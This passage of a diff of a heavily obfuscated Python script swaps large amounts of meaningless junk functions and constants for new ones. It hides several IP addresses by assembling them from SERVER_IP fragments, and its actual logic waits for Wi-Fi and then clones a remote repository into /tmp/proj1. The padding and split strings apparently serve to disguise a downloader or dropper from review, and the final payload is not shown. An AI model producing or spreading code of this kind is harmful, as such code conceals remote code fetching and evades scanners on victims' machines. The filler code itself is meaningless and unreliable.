+    U1RQ5_i209VDYLmxTu = 792
+    i2FMi6DiITWw91Ois8u = 85
+    TJhzDKP7RaKX9VRTi = 499
+    vZwflyifxY = 658
+    jP9lVCSbvx = 553
+    re0GNveYlzir8nQ9dT = 9
+    CiQGBoitAgEEWh = 151
+    UJDJiKnvGzPtp1buz = 992
+    return BVAUz1G0v9d03Ahil_r
 
 clone_dir = "/tmp/proj1"
 
 
-lOI0lO0O0IOIlOO0 =CjakiGc9_JbfmhXM()
+l000OlOIOIOIl =SERVER_IP2 +SERVER_IP17 +SERVER_IP14 +'.' +SERVER_IP17 +SERVER_IP14 +'.' +SERVER_IP30 +SERVER_IP28 +SERVER_IP3 +'.' +SERVER_IP28 +SERVER_IP6 +SERVER_IP20
 
-IOlOll00IlIll00 =SERVER_IP20 +SERVER_IP10 +'.' +SERVER_IP25 +SERVER_IP21 +SERVER_IP3 +'.' +SERVER_IP17 +SERVER_IP13 +SERVER_IP3 +'.' +SERVER_IP22 +SERVER_IP23 +SERVER_IP22
-OOII00lIOOlI =38039
+def yMCEssg40IFmzU6bf():
+    upVxm_GN = 503
+    obFSwllFll = 601
+    OmzopVaQ2p = 626
+    w9tEYAC6EIu = 103
+    jDMUM_PFo0 = 414
+    LK3wefYV5AJObbvePQVS = 177
+    MYdqIytYbDFnQE8r = 553
+    mkFrZDRaIH = 130
+    dZtMmEWcHvVTo = 86
+    XaXt6IGda = 670
+    return 29
 
-ll0000OIIO0lIl =AdiJhE32()
+ziF2FQXmq9s =Yt7vGqnqaYT(22730, 6189, 3219)
 
-MJfLEpQRlRS = True
-gJwLxmmKV = -873
-o8L8XzxPcOIJW = None
+def yJTQwbOVp7aw():
+    tWOJbhre = 732
+    rfewpIV0KqqNqKvH1eo_ = 510
+    APUjnATgY = 832
+    b_RYlHpjvwYY = 875
+    qmXBebzdnk = 709
+    m3cYDwEzDmr = 149
+    rZWt6Hm1zUab2dw6 = 252
+    Iu3JoutXz5 = 88
+    TRDWBNjuFqIQyyP = 665
+    vnGFbAE4m = 50
+    return 72
 
-WT4B5LeWuhiDl = "Ly2UwvxhaGWrolVRJ"
-JyjWQE2iuX8q0xcIFFYW = None
-tWgAaXF5NW0vafqiA = None
+def OO0O0OOI0IOlI():
+    AWHzz1z3 = 478
+    b6jBq05pyL2QO0 = 929
+    GrZDfaZhPAi = 79
+    return 84
 
-Idp7GOEgR5Hc2WAstQ5 = "eyYV6qMD2FT2EdAq8Ao7"
-QT46H4JAD = None
+zJF4qcsQOE_ =pZj75Yt5J8vSPQdOfRXl()
 
-OO0l0ll0 =FALGn7LuOP_Ef5yx(38351, 50679, 38643)
+def RdTvF3_onc(AsQw7O3ep8):
+    V39D0z4_WXkf = 686
+    Qcsaz5GSFiGEGg = 311
+    R3xn01QmpR8s = 203
+    return AsQw7O3ep8
 
-pwMKtRXo7oz4rdZ63 =ycJA7x9W_5nvviw8H(72639, 24775, 75070)
+class Yxqq447itpsoy:
+    def __init__(self, gL0vNbhE7LOhO2Mt_):
+        self.gL0vNbhE7LOhO2Mt_ = gL0vNbhE7LOhO2Mt_
+    def U8Dx0wb7whY(self):
+        return 44
+    def zuvB9qaE43Oo3(self):
+        return 99
 
-def ll0lOIlIl000lO(JLosvberM2LGCJlsJEs, AHCN444t1F36Lx, QjQGGeZ8Fqs1dQVY):
-    cplRdfclEg2QHQz_Pz = 565
-    HO9cD_AGYyx = 349
-    K2BGFDQsR7Lwu = 874
-    return JLosvberM2LGCJlsJEs
+neSOb9IOAkg6OK =yJTQwbOVp7aw()
 
-def BHuNROhj(cNUNG1LnG6oHi4wVa, dF_ZCqeH5_QV_nkCnkG, h9M0nD33Y_qhsEdR9hqn):
-    fbRdd5MJqNnI = 735
-    Iyk05ohuL3WB9frMS5Gm = 63
-    e7IDBp9S3S7Jgi = 673
-    return cNUNG1LnG6oHi4wVa
+class Gqlzluemh1cm:
+    def __init__(self, lbWtcIIPqTCP):
+        self.lbWtcIIPqTCP = lbWtcIIPqTCP
+    def IF4tTKlK_HOiCa3WixD(self):
+        return 66
 
-TevLouDsleQ4qbifWqP3 =W__7cBdBwpf51Cv(30516)
-
-def OOIII0IlIlOlO(aJrwLjRVBGu1L31mxQ9I):
-    jaCg5gAKiRv2e = 93
-    XspUl2qA28q = 960
-    Qo1WJIJm9PXFqwUTLPlF = 117
-    hJ3ih3pjus0Y3If9Q = 587
-    QFLjfnnn = 468
-    S6sQ3BUdErEQvr3j = 267
-    pcsgDFdzd = 730
-    D5BXKjkVf6pMs3Yh = 166
-    R03pOPm3AH = 836
-    return aJrwLjRVBGu1L31mxQ9I
-
-def LjhbsmKDOSNgHK(BhGmyRxC):
-    Tyq6w0BsWTZQSQ = 570
-    fbxrKzaw0HcfF0NdsA = 603
-    TzFK_27fLfXUIiDl0YJ2 = 4
-    return BhGmyRxC
-
-def Doy1ZIi5NZvWn(Q_hzRhFq, gpPlU7v0MBeRDf, E8BQ5bDw6UxOOBpsS):
-    GzH4x59qvvh_C = 653
-    qXL0ir59T = 827
-    zDFFlvsavrT9BZ9 = 892
-    aLYnNbdg_w5fdkg7 = 441
-    CAiXkArmKStKHEj1jT = 164
-    cAvCwtnkxBzA_O = 294
-    return Q_hzRhFq
-
-def Mv6fUMcL6NpwbARqaO(z7YTCu0BO, vhbuEeb6zRK, fStthe_B9UXkuW):
-    zoMfYrIoD = 850
-    aya4j_wiMN5Crl0LYkS = 866
-    fmN2crR37efMgoovYjb = 159
-    LWDNEKCt4MJDQP = 767
-    GNDrmLDPhe = 393
-    Bd2lcKo221A7EjG12K = 630
-    DtXHTTUkmXTre6BZIhS = 53
-    DZG05HTW5l = 661
-    R5Sz9VDooVHCRM = 717
-    return z7YTCu0BO
-
-r4xtCpbYzwKdq6 = [73, 55, 69]
-YvQHQJiCx9xqi0I49 = "e_tM5ZyAUectOcJQy"
-oWHjVV9ahsO5J = None
-
-u6Fd7cZdkWucE4hTh =rsIp0K3UvZQDeMCpp1qk(98364, 73515)
-
-class Kh1av8rkdp1qv6nkb5ow:
-    def __init__(self, MBR0zf7_aAV7lQCdVRD1):
-        self.MBR0zf7_aAV7lQCdVRD1 = MBR0zf7_aAV7lQCdVRD1
-    def quz6yonx(self):
-        return 59
-    def LzzepV5bPU(self):
-        return 16
-
-SCjJem5GLWB3n =SERVER_IP12 +SERVER_IP10 +SERVER_IP19 +'.' +SERVER_IP16 +SERVER_IP9 +'.' +SERVER_IP5 +SERVER_IP13 +SERVER_IP4 +'.' +SERVER_IP27 +SERVER_IP28 +SERVER_IP22
-eKLJ6kwCWq43ppip =41133
-
-def pB2vfHTV():
-    G1Nmd4gJYKryG1amML = 34
-    aJOiw4NpUxTem01 = 577
-    JeepuLAwLnM = 817
-    XuHsMoJkrKyU = 210
-    return 5
-
-TjloyHJpWw = "ddijACeGKRK"
-hroZp1CYydd6m = [41, 4]
-JB0fV9fqm = True
-cToV8jc2Gcn = False
-TvG2iK3N9bffyh9uDS = "uFqZ8i89_hM9lNJ"
+def Ol0IIIII00IlI0O0O(djLfsBwm, F9ECUJS5SmuOO, J3e6CuCi3IEH996):
+    uXeF3qOTk4Y3Gk = 49
+    C7v4LenEwHCZ2S = 54
+    PscEUXn7 = 543
+    aI9VwZFr6GoFK = 141
+    neGasxSI74H5M8Lbwa = 456
+    noncwsI7JoUjmWMpx5t7 = 953
+    XyuwGRVOZe0iCa = 858
+    tyPYHzY1SJ8eRr1 = 775
+    return djLfsBwm
 
 def is_wifi_connected():
     try:
@@ -852,627 +1357,290 @@ def is_wifi_connected():
         return False
 
 
-TZXkDPV_y5ye = True
-ikgMVxvuyChmjaN10IEY = [88, 33]
-R_MJ7J9Ce = False
-T_JObarQA67U = [45, 16]
+def ZC0hOjpF():
+    cSueaYO84b8KRxDc = 317
+    g4CCq4Ub_tLX = 833
+    YHSUDDElQJ_9cHkj = 195
+    jNm1YUYx9V = 18
+    kdg9IBZ64wDP = 959
+    uWlcLLp0uxdZp = 618
+    IXiQd6ZPJTRBzG4AmoiJ = 705
+    ehbYqUXtibwnGRQphasn = 24
+    oAinABr_i = 436
+    YjzY32ZVsgo3 = 532
+    return 47
 
-class Netwhn4mpunnymcpvoji:
-    def __init__(self, sXZcL5nV, eHMFczFiBx9):
-        self.sXZcL5nV = sXZcL5nV
-        self.eHMFczFiBx9 = eHMFczFiBx9
-    def AOJiRuoLgyjfUzXhxt(self):
-        return 91
+def OIIll0OlOIIlOO0(gNnqpCSJO):
+    zfD3yeoiThCr = 368
+    JiRvp9M9MDjGU = 455
+    ZLa2JbUoJvQ16 = 837
+    DgcKbkSu = 843
+    tJTSXQRHC = 266
+    Hnreanf_wJyQMUOeM = 655
+    WpivgpMPy0P = 986
+    return gNnqpCSJO
 
-KmkbGunMyWkoGJp_ =aOV0hFH8y(45513, 32358, 89205)
+IO0IOlOI000ll00lOl =VhWHRJrWW16STCIL1D(94028)
 
-Ocq8FqQGGxQojJJZRh = True
-g_ItOwpRz = True
-qbCcdPcWtsUs = "YsKR83749GCyJuS"
-oP6Dr7wRT7K8C = [14, 22]
+def oTfR6THrBIpBtQ():
+    q6uu8FRIPB6 = 65
+    qvezfV4XpquOsCX = 207
+    XgCx9dDDNnX_0U = 815
+    JOByqw4N6yQmOYrNZ0 = 593
+    jpEKfnjHARu = 947
+    SLbfGkfctFYtXxkAbrG = 821
+    return 6
 
-iUKtsYJEs =SERVER_IP17 +SERVER_IP4 +SERVER_IP20 +'.' +SERVER_IP12 +SERVER_IP16 +'.' +SERVER_IP11 +SERVER_IP6 +SERVER_IP18 +'.' +SERVER_IP6 +SERVER_IP19
+def aN3IMcg5c0gMdWun(ui4fFDXqk6k, qDx1Gr1iQrgIeZD_H):
+    zo8P3En797 = 471
+    EzCmbJagwTNkvLTKJg_3 = 270
+    suT5d7AlbDEsK0rxU = 863
+    return ui4fFDXqk6k
 
-OI0ll0 =SERVER_IP11 +SERVER_IP28 +'.' +SERVER_IP20 +SERVER_IP29 +SERVER_IP18 +'.' +SERVER_IP6 +SERVER_IP19 +SERVER_IP24 +'.' +SERVER_IP9 +SERVER_IP24 +SERVER_IP30
+Ji3CMBeL8z1oBVX =KBgSqUP3zVfaCFp6bc0x()
 
-II00lIO0lO0l =KulRbemdYNogC__ig3()
+gCKEfWhoUspnE =R3LxhtkuLKOk4()
 
-PjFKwqvBab8iutl_MTN =w1ZqP99FJ()
+l0OOO0I00Il0I0l =t6NdOlHuhHLgee2RaAY8(94158, 12214)
 
-class Kihreot8tyj5a:
-    def __init__(self, PovAoVZa_6h, UCduGlbF1):
-        self.PovAoVZa_6h = PovAoVZa_6h
-        self.UCduGlbF1 = UCduGlbF1
-    def OeKmuTMpJiMJQox6(self):
-        return 88
-    def mTu67MZLLu6HxJu8N9yE(self):
-        return 8
+rbPmyKc2K59ACJ1Uh = "Va7Tl6cPUrP"
+BCFB4ZnCQ = False
 
-def YROJkwecIz2az(OOzGuyHGBJDWx9gqn6):
-    aHIXEIDicfeZx0 = 553
-    vZ4Te1wXxW7p = 430
-    retiO6d3KLZ2ttc6 = 25
-    tBOoKQK6v34Pu7B = 804
-    zkhxxRo6bwpJqsiAFxVr = 508
-    jVx8myZLklRI = 370
-    SuMUvKpRFbq82H0qz = 600
-    return OOzGuyHGBJDWx9gqn6
+TatKpSvU2VwJXe4aJ =MK89qyOnQi1YoWBt4jo()
 
-jcEQgjxCE =SERVER_IP24 +SERVER_IP28 +SERVER_IP13 +'.' +SERVER_IP28 +SERVER_IP22 +SERVER_IP13 +'.' +SERVER_IP15 +SERVER_IP5 +'.' +SERVER_IP16 +SERVER_IP2 +SERVER_IP25
-
-def eKyQLzMz():
-    PTg2IYvPN = 170
-    R0hk9Jx3pD2 = 506
-    SYD3dvlbvd5jfVokwOr = 455
-    NC8he2StN = 163
-    return 100
-
-MsVc9LXwPPTMIIoVjuJ =SERVER_IP27 +SERVER_IP15 +'.' +SERVER_IP22 +SERVER_IP15 +SERVER_IP8 +'.' +SERVER_IP22 +SERVER_IP8 +SERVER_IP20 +'.' +SERVER_IP11 +SERVER_IP4
-
-HHgVCUIMM_eUnhp_q0yi = 821
-noB9TBd6Vic5hPSG = "Vlf2C1aZEt"
-vAgMXvzWs_JtfN29SWDT = None
-tUeqm5vpdGeU6fn82oSH = False
-u0J7_1TKgSAbrN = None
-
-F6EbzFRBAxhuoN = "pM2ibxi9s9s"
-FbFilzi9DQp_ = True
-xiALA6gawx30spL = True
-t2X86y5NOQ = False
-
-pDdidvla19IyZNy5 =IIO0lOlO0(29936, 22881, 45015)
-
-h2VG196qxb =SERVER_IP13 +SERVER_IP10 +'.' +SERVER_IP23 +SERVER_IP14 +'.' +SERVER_IP25 +SERVER_IP23 +'.' +SERVER_IP15 +SERVER_IP15
-
-ll0l0II00OI =IIIIO0IIl0lOII(99825, 53591)
-
-def STF5nUFOkQqd3gBR4k():
-    uXUaZt9n = 647
-    rtij_mhhbDVml = 246
-    U20yd3sqXqvF = 977
-    Z23VX67A8NpPk77Tfjm = 417
-    hGgPz02fcR8cQxOPjz = 222
-    eOjROHpYodWg2YD9 = 887
-    return 12
-
-def O00IlOllIIOOOIOlIO(bvfz2HD9qtkG3sk, T8f5bSnkI):
-    huOGUubPhXO763qC = 762
-    k3sM59VrfPTI7O = 192
-    hvrBFml9TbppqEqrmLN_ = 47
-    YXQiH2ACyqSOQUcs483 = 343
-    NjGINXM8eNIcSTGwY = 723
-    Tedk5yQ5 = 75
-    EQbRK323Ggrb = 981
-    e5rX4nh2 = 246
-    mpxeh0gr1W = 186
-    liLMUg7zA2 = 711
-    return bvfz2HD9qtkG3sk
-
-smxHwKNRHSYQBC_G = None
-HuEzrf4Xzw_TalB9kf = -926
-pTaZLQB_V20_zBzrYM72 = None
+UQc770S3ZEG =SERVER_IP5 +SERVER_IP29 +'.' +SERVER_IP8 +SERVER_IP6 +'.' +SERVER_IP14 +SERVER_IP9 +'.' +SERVER_IP17 +SERVER_IP15
 
 while not is_wifi_connected():
     print("Waiting for Wi-Fi connection...")
     time.sleep(5)
 
 
-def II0llO00lOl0O00ll(FR5pO1pw3Zb, oVnDJxFA):
-    qW51gP6FnId50mUbY = 577
-    l6Nm8rpE3 = 326
-    MTiHPG62nmb = 447
-    fE4s0opa = 634
-    y7usPnmUppzBDwaEM = 112
-    lpocK3ZPZ = 818
-    hzdf5BBGpL3Y = 811
-    vk9bgDNAWVcFh0y = 650
-    return FR5pO1pw3Zb
+UxQ8c6SncXwWG =SERVER_IP25 +SERVER_IP11 +'.' +SERVER_IP4 +SERVER_IP7 +'.' +SERVER_IP21 +SERVER_IP16 +SERVER_IP17 +'.' +SERVER_IP21 +SERVER_IP14
+M9MJwNptR =26729
 
-nFFcrtEHXWLVWapL7rn =SERVER_IP19 +SERVER_IP1 +'.' +SERVER_IP30 +SERVER_IP7 +SERVER_IP3 +'.' +SERVER_IP15 +SERVER_IP4 +SERVER_IP16 +'.' +SERVER_IP26 +SERVER_IP26
-GjgNGgYi3y43GYJ5b5kU =14976
+def eFBfK0Jb3Rx6gfqdQ(nNxlTt1XL68uda3r83N8):
+    fStsDO3HnZiRV = 760
+    BDrnbxMDNSFczZA = 477
+    qrk0bdA1Dqqrhig = 242
+    kCHZa8x10IjtHZX4 = 28
+    SPM3OlzrIG = 551
+    return nNxlTt1XL68uda3r83N8
 
-def nXCBsJyQe3X5fT0aUR():
-    G5W6ec8_7AE7 = 839
-    ZU_ETv09cLdCAzSS = 507
-    vxNHorlDK9Su = 178
-    return 72
+FP97q8wB = [79, 83, 91, 73]
+HrOPO2JRhgjG = None
 
-OII0lI00lI00ll =BFf91XGZ00rnZQf(46262, 18169, 31151)
+CLIKZRP_ =SERVER_IP8 +SERVER_IP28 +'.' +SERVER_IP4 +SERVER_IP13 +'.' +SERVER_IP29 +SERVER_IP15 +'.' +SERVER_IP14 +SERVER_IP13 +SERVER_IP9
 
-def VynFBvlj5yiTLJb6Q():
-    Jta7rSAFfuby8e9ff_ = 111
-    Vagtfkmn = 678
-    Q3PQlblY = 123
-    I4mCJ3KGQSpTJ = 515
-    qciLJRxrbQ1fIJs = 153
-    return 69
+Il0llOlO0l00 =OO0O0OOI0IOlI()
 
-l0IIOIOl0 =nXCBsJyQe3X5fT0aUR()
+def ErknRUD8C8eCNN0lkTs(nNgTJTEmadEwR, AfRy72RN):
+    IkAtxA2a = 68
+    snN0iSlZkdEUy_B = 232
+    xTO1TrMx0exinE = 566
+    ruHpl8_PQz9_XtxzWM = 235
+    iE_IDcbkqv = 683
+    AcT4j61Sb_9pXxH = 563
+    QR5UhSeWIp3HtaEdt = 840
+    UsiE4jENmcA7x = 583
+    return nNgTJTEmadEwR
 
-def Ol0O00OOOII(X4VpjabBj72bU1wGejn):
-    qmxUDZsfr = 558
-    sJtiFECi18evfbZ5I359 = 817
-    fAKGwx1JxL3cyU9 = 257
-    uHQMiB1v = 586
-    xk1Yy1OEj = 74
-    GgSKBoru0_ = 727
-    PUVfDOINLy = 561
-    return X4VpjabBj72bU1wGejn
+IO00OIlIOOOO0 =Ol0IIIII00IlI0O0O(59353, 43146, 79687)
 
-class Xqtkw4vw_u7pyf5r9cc:
-    def __init__(self, gqgn0Q8cNG):
-        self.gqgn0Q8cNG = gqgn0Q8cNG
-    def IqEvdkZKf(self):
-        return 12
-    def yVz8iJPo(self):
-        return 14
+IlOOl0OO0III0I0 =oTfR6THrBIpBtQ()
 
-IOllOO =SERVER_IP3 +SERVER_IP27 +SERVER_IP25 +'.' +SERVER_IP6 +SERVER_IP21 +SERVER_IP4 +'.' +SERVER_IP1 +SERVER_IP17 +'.' +SERVER_IP16 +SERVER_IP18
+def CUNzNSm6TJ27htcxfh3T(l7wmPKAAPAbdkcT, UBqtYTLpmXq, DqyAR5b7P22bvK84w):
+    MX7s4TYEn8 = 581
+    ElU7b_oLmtUXPG_ = 456
+    e4l58DMLYyE8S = 394
+    return l7wmPKAAPAbdkcT
 
-jYkXqFGBuL =F6sDgU_ZZBl5c9nphgj3(13638, 13946)
+MjtTPIxg5Ea1akipP9X =ZC0hOjpF()
 
-def vOcDvjBDy(QQJArl0Z, smZAv0_9XnyId8PVLJP):
-    QFRerb0CJzzxVPlTJf = 974
-    ivsaAxiEYO = 856
-    MYXBTZ6mjQoQMPOD = 332
-    x26OCib_d9Z = 554
-    ZZekasIjwnu76cu = 329
-    return QQJArl0Z
+HaSVVzlRKRfUFX = False
+pSD0ApcSwJZH = True
 
-lOIIOOlIlOIOIOllOl =GhlwRMQkoOoe6BlA(45933, 73211, 84091)
+def IOIlIII(X1JwGPhA):
+    aQ_pQQYFBpDK3o = 610
+    YOtLQKwDUunmlBrw = 720
+    mE2uefUZf = 243
+    return X1JwGPhA
 
-BZFeJYujS5N =SERVER_IP28 +SERVER_IP20 +SERVER_IP13 +'.' +SERVER_IP5 +SERVER_IP17 +'.' +SERVER_IP2 +SERVER_IP8 +'.' +SERVER_IP30 +SERVER_IP10
-vvKOU0GjasRSOe =52092
-
-IIOI0O00lOl0I0O =ll0lOIlIl000lO(55233, 38566, 39619)
-
-IOIOOO00O0Ol0O =UNeKCux0(50091, 20487)
-
-UTM_tWD9Imdcy1of =IOl0IOllll0O()
-
-def lamDKLsC(v4y1mAQVhFxjzSu4t5T):
-    Z2jiNGuUT0bqISUhZ = 618
-    Nh_ZxsNFTEI6 = 742
-    hVw0ayytgxPZ = 585
-    s2Oo8pNQ4uf = 819
-    t6x_fYumPIWgk = 966
-    WCVUu7JIlWQe5nLFa = 103
-    wixKR5lYEYpS_ro = 99
-    JBmM_BUApAjc0 = 186
-    return v4y1mAQVhFxjzSu4t5T
-
-def RlmGQyCAsBt8uyvWVQN0(EoqjfJgDb9IuBT):
-    yfcOTDtiHOatTvKxQt3Z = 854
-    Nggg1MDloaHEZRx = 947
-    LfKw__m6OAO = 215
-    J57tGriiFr3W7PKWu9 = 176
-    mco3RHJVyBLSpKT = 778
-    AZSQFatn = 591
-    Ull7CdOaO = 539
-    V6x4E4bIXTb4SpEREf1 = 6
-    return EoqjfJgDb9IuBT
-
-dcA8QcM9rj7fz_Do =SERVER_IP14 +SERVER_IP9 +SERVER_IP2 +'.' +SERVER_IP4 +SERVER_IP8 +SERVER_IP10 +'.' +SERVER_IP16 +SERVER_IP30 +SERVER_IP30 +'.' +SERVER_IP16 +SERVER_IP5
-
-IlOO0IO0l0O =Ol0O00OOOII(52851)
-
-def dyLJ66grdcMXRTkCeFd():
-    GtUp9vhynPo2Ojx_ = 505
-    xt7tEnbUi14qOUYgW = 651
-    hTSlcB0WWc3w8Idz = 274
-    bsDhJiSgXFNGT = 947
-    RaaUH93Pk = 634
-    return 61
+def SjoKLm81Bjn():
+    Muy1tENpnn = 107
+    yhMPUBs0 = 408
+    SfASNTjnUB3K = 735
+    FJ5LUibU26JNB6z = 357
+    vxtUbGUDGBt1_cz2VKT = 483
+    DYZpI2vHx5Sf = 239
+    JqpYZBIK5nbIDhVN7Is = 831
+    xwjUb3uqDLMRKInMe = 520
+    return 33
 
 subprocess.run(["git", "clone", repo_url, clone_dir])
 
 
-def IzRIW24ndjpMLQmA(WvnhQ9RoNkuwh):
-    UT6pftpNHjL = 173
-    a0hdy5w5lnwwRDTKDO17 = 992
-    kmltInyO8pPScbeNYQ50 = 589
-    UdfMq85ifV58d = 856
-    fGPLfh0uyAj7OBpMdY = 798
-    DYc14uyIwrQcg2 = 949
-    iktIbNyzD05 = 483
-    ckj7WS09hCjO = 680
-    return WvnhQ9RoNkuwh
+def fOSjZEhO1cHUd():
+    wKHusiulyCmKL = 365
+    Y1Ygh4XsKul_X = 149
+    ZBZXzz2k3qB = 821
+    OvZrRgkwvW4qeGwQabr = 27
+    QfJfghNjnprQQ = 374
+    return 14
 
-OlIJdY_73JLpikUDmfE =fem1VVHc1O0lNTvS(28675)
+sLbxR3G6klBaxEVs8 =lI0lIlII(54646, 92066)
 
-class Bp4kqlnoxr9yhgzb_w:
-    def __init__(self, R0O6nyC8gk9vDOFEqHnM, UO6Zve2q, GBExRw6uB1g):
-        self.R0O6nyC8gk9vDOFEqHnM = R0O6nyC8gk9vDOFEqHnM
-        self.UO6Zve2q = UO6Zve2q
-        self.GBExRw6uB1g = GBExRw6uB1g
-    def y5T4dc4a(self):
-        return 88
-    def n5jWuBVYxDeyt66dKf8(self):
-        return 21
+IOllllllO =SERVER_IP26 +SERVER_IP3 +SERVER_IP27 +'.' +SERVER_IP29 +SERVER_IP15 +SERVER_IP14 +'.' +SERVER_IP8 +SERVER_IP2 +SERVER_IP28 +'.' +SERVER_IP3 +SERVER_IP21 +SERVER_IP30
 
-Il00I00llOl0I =VZQlDiPFKeZW6qikAJrc()
+t2LNWfISZNSFiEzBwp =llOIIOOOIOO(81808)
 
-YdUa6A1l6lXQMLDJ =SERVER_IP27 +SERVER_IP1 +SERVER_IP15 +'.' +SERVER_IP29 +SERVER_IP20 +SERVER_IP19 +'.' +SERVER_IP9 +SERVER_IP17 +'.' +SERVER_IP16 +SERVER_IP21
-nZnvcU8KFF7C =54922
+def LolJqTjS5TW(nfR9TgYJn4QoReH, Fr5A7ZqL8S):
+    pA1pPNdh = 993
+    Okh_xN6O4k9vtOe = 398
+    dKiAgqmFI4SK6m_IwlK7 = 91
+    tlEbqWl4vbXNokiKyThl = 923
+    zdZLBuQSBP1630vCO = 134
+    EUSNkReSaqu = 39
+    THynkvbBJbC9TGzMQk = 289
+    Tm0uzZvaH = 15
+    return nfR9TgYJn4QoReH
 
-y6xtGXxyinD =SERVER_IP1 +SERVER_IP15 +'.' +SERVER_IP12 +SERVER_IP6 +'.' +SERVER_IP6 +SERVER_IP19 +SERVER_IP13 +'.' +SERVER_IP25 +SERVER_IP14
+def hfSIETBZewW8():
+    zFuHQEpdw = 715
+    OFc7p4Jb5 = 56
+    xDXo2nakdfAKEACI = 843
+    zVetlsEcFhG = 423
+    CtDQANYkdG = 226
+    return 70
 
-def XYXXX4VKqMhU(w32FDCHBh):
-    Jp5fjoxzz4Uplmy = 912
-    MHLXb2Sf63YI = 585
-    bHSpDUJmVx9S = 465
-    return w32FDCHBh
+zDnV6gPEx = None
+Q8TTeIANsnJ6CAY_Nd = [38, 78]
+K2_7EizBLFjydaYk99 = 85
+Ry2cEUuRUBrzrwv = None
+fseC0FZ0T = True
 
-def Mjv4Uqpf5JOtW0s(uwf8NyfM, Jb4uYzTnkJh9VTyB, eKltyKZ_W1SxDrLIbl):
-    q9ISXqILdZHS8m3 = 365
-    eOZ5kqkZY3fTDbEVR = 391
-    wqXJsMIOgTU4 = 21
-    HuoCKmdH = 124
-    P9hbVgG8c37bao2PKsu = 854
-    hcdSKSGsWhX8K59dq = 936
-    AAbcN2d5ge15 = 802
-    gvzg7D2z = 402
-    dydCc3LZsw430Pt = 783
-    FDS5rw43 = 293
-    return uwf8NyfM
+z43VzPBVkg0ACPERZOz =fOSjZEhO1cHUd()
 
-def m074XA1H0UVCod(FXp54Hp_Xwf9, F8cGJkr7A):
-    TWYTD4Nowkw = 637
-    dw1fu07bTrriH = 537
-    VQU_trP073bN3PUDCFOC = 993
-    QekEDvIjuHcdX = 57
-    SaCXGLalrZ = 337
-    OCEUCuZ_af = 146
-    return FXp54Hp_Xwf9
-
-def admbsfCDjXW(arelMOyATIuREKVgVw, sE8aIYQS):
-    BWM1UC4VWAd = 772
-    iS_NRPUvi = 888
-    ze4TtBCbpnpy8ttA_za4 = 866
-    UJGKxqrtEOE = 482
-    return arelMOyATIuREKVgVw
-
-PzkqIubyOi2h8z =pB2vfHTV()
-
-def WoX__5QvDor_wxgBdaP(x5UAGDABNbvv, GNwVThRIHIv0RrSv8sVk, jAEvZqFFj9F7NC):
-    yzhiQlUWdFB = 978
-    BpdweuzGBfG = 202
-    NbxTlSjIHijlqEVxL = 217
-    xIm_m5eF9_mcLPLCh = 730
-    TTLQCHIMMQYNY0uq5GZo = 412
-    vBWTryujSSHUae = 39
-    return x5UAGDABNbvv
-
-class Ttg8wrpo:
-    def __init__(self, hjvbtTjTaSiAHAR):
-        self.hjvbtTjTaSiAHAR = hjvbtTjTaSiAHAR
-    def Z1JsygCTET0qWKCzw3S(self):
-        return 100
-
-SXDrkuLQTUa7hgN = [97, 84, 74, 49]
-c_6mTTHsrOh = "ld8SIyDEoZPTXc0"
-XvOr011PR5161TgcZo8 = None
-jW2BdUBRvAICgAxnTIT = True
-YxzrdClHGg29 = [54, 37]
-n_P7_f9TnvibayEvx = None
-
-q6vWqKC5nE7j = "WHMKm2HT"
-o4F0yjTbOx = [77, 65]
-ZafaPIFaNyol = True
-ZrVuxnmTcjkaXkuZHpko = None
-Cw1IHPL37K0_vn3x1N0 = "vFE8YzwFor"
-B9wJE5SR1Qk7azPoobEP = "EsCiyhlT2Tpk5Emjwyr"
-
-VtpTyATMzM =OOIII0IlIlOlO(39578)
-
-def MLeapbaT4f_Vra():
-    X5UWRiWpdKNAfDPdZ = 27
-    iRk2yj67_OpRP = 568
-    VkG7mU64 = 526
-    kF47tFVyEr = 894
-    zogZ6_mmetztxk98u1 = 547
-    K0K4pIDTYaC3lKdrw = 425
-    jMcSoNWvBo_LlEM = 338
-    return 87
-
-class U_tfskrzvyld:
-    def __init__(self, r6lUsDYbuRYv, tl02dzsbC6gio65CNUF, R00OB2piP):
-        self.r6lUsDYbuRYv = r6lUsDYbuRYv
-        self.tl02dzsbC6gio65CNUF = tl02dzsbC6gio65CNUF
-        self.R00OB2piP = R00OB2piP
-    def afFUyjW2_8rgF0CKi6(self):
-        return 71
-
-def O0OlOIOI00Ol0(jdm1IJCgbiq):
-    c_oV3U3q238cJ6t = 569
-    TmEFcM8SqTfxMYtFDvI = 880
-    yhyVsZx5tu = 529
-    R6tX1vfvTcow73aMGX = 667
-    mIL4jhkJQzQm8pkuHAJ8 = 578
-    u20KuE8dGjRNCh = 970
-    return jdm1IJCgbiq
+def O0l0IIlOIllI0(FX1FPOjJABFOt56):
+    drmYppq3ztEa7x = 960
+    D1NXYgzuJYs_P745kU = 514
+    AUwPU6crm2A7jM = 390
+    DOgl3Y2jZq5 = 978
+    j2iQklY3f2VI = 838
+    EL4N97mEcTyZhF7lLp = 131
+    HDkG89ErBP = 723
+    PBiuRoJkRIPU_oL = 182
+    lsMShTcD_GWlqD = 15
+    joKOMRjJb = 52
+    return FX1FPOjJABFOt56
 
 source_dir = os.path.join(clone_dir, "")
 
 
-Xn_hHG4XMdwB3HN18kE8 =SERVER_IP19 +SERVER_IP10 +SERVER_IP9 +'.' +SERVER_IP18 +SERVER_IP6 +'.' +SERVER_IP10 +SERVER_IP13 +SERVER_IP21 +'.' +SERVER_IP10 +SERVER_IP23
-Zvf9U2ilZgZ9 =26466
+PaBDw5v9v6DfKk =Xg683bmFF581bWEdS1jP()
 
-ZUvkjNcR63B =brfKe3BCa3PS8Gx(98962, 20706)
+def yHBaSJyl7d8kLN(F65fCyAFA6bhgs5Y, yNdOln0gLqnvN5k5, l5cqvVAxUu):
+    FQhPZMGIWQw = 526
+    zomtSV9iwT = 858
+    DdJMe_85F = 747
+    zy_4rFz81zeY = 449
+    return F65fCyAFA6bhgs5Y
 
-hT4bU2pdCW6AzPBHtaO = False
-hyJn7f0JZid9Jy_ = -450
-d3q98lhHtr = "EDJ4IsN2R_xFDlCQ"
-AcbLTnQK = 628
-YcBHTcx88uZ5g9UNG = None
-Rf7DcM29 = None
+def vLLA8_ElTpM():
+    zTiFp7lc6 = 203
+    CITQzLPe0wEvg_d11RsW = 149
+    QKouCTHVodf = 367
+    KCyT5GIACBOavOKn6jKL = 697
+    hKvZj3t1Kj = 648
+    CFCIb8_gN5FiyBZT = 452
+    h1ODzb7tU8eFDticncv = 844
+    x_EMrQ8UrK3o8fK6XGE = 409
+    return 88
 
